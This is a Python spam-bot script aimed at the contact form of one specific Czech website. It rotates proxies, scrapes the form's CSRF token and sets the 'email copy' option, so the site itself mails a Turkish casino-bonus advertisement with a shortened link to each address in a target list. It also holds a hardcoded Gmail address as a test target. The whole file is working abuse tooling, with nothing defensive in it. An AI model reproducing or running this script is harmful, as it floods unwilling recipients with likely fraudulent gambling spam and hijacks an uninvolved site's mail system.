import requests
from bs4 import BeautifulSoup

from module.data import get_proxies, generate_proxy, try_to, main

proxies = get_proxies(r'proxies_folder/west_proxy.txt')
proxy_generator = generate_proxy(proxies)
text_body = '''Herkese verdik! Sana da verelim! 50 TL Casino Bonusu!  https://bit.ly/3aM5iOf'''


@try_to
def get(s: requests.Session, proxy):
    proxy = {'http': proxy, 'https': proxy}
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "max-age=0",
        "sec-ch-ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1"
    }
    url = 'https://sympathea.cz/index.php/kontakt'
    return s.get(url, headers=headers, proxies=proxy, timeout=10, verify=False)


@try_to
def post(s: requests.Session, target, proxy: str = None, cookies: dict = None, token: str = None):
    proxy = {'http': proxy, 'https': proxy}
    url = 'http://sympathea.cz/index.php/kontakt'
    data = {
        'jform[contact_name]': 'Herkese verdik! Sana da verelim! 50 TL Casino Bonusu!  https://bit.ly/3aM5iOf',
        'jform[contact_email]': target,
        'jform[contact_subject]': 'Herkese verdik! Sana da verelim! 50 TL Casino Bonusu!  https://bit.ly/3aM5iOf',
        'jform[contact_message]': 'Herkese verdik! Sana da verelim! 50 TL Casino Bonusu!  https://bit.ly/3aM5iOf',
        'jform[contact_email_copy]': '1',
        'option': 'com_contact',
        'task': 'contact.submit',
        'return': '',
        'id': '9:contact',
        token: '1',
    }
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-length': '275',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'fe9760f0f5e05131e2695ba1cf55aaa4=385844b908f106b5b12be0d68b551b21; PHPSESSID=647538205c64d97a81ae4d3aa3d4a4d8',
        'origin': 'https://sympathea.cz',
        'referer': 'https://sympathea.cz/index.php/kontakt',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    }
    response = s.post(url, data, headers=headers, proxies=proxy, timeout=30, allow_redirects=True, cookies=cookies)
    return response


def spam(target: str):
    res = None
    while res is None:
        proxy = next(proxy_generator)
        s = requests.Session()
        get_res = get(s, proxy)
        if get_res:
            soup = BeautifulSoup(get_res.text, 'lxml')
            token = soup.find_all('input')[-1]['name']  # //*[@id="contact-form"]/div/div/input[5]
            res = post(s, target, proxy, s.cookies.get_dict(), token=token)
    return res, target


if __name__ == '__main__':
    test = spam('softumwork@gmail.com')
    print(test)
    main(spam, targets_file_path=r'targets/all_turk.csv')
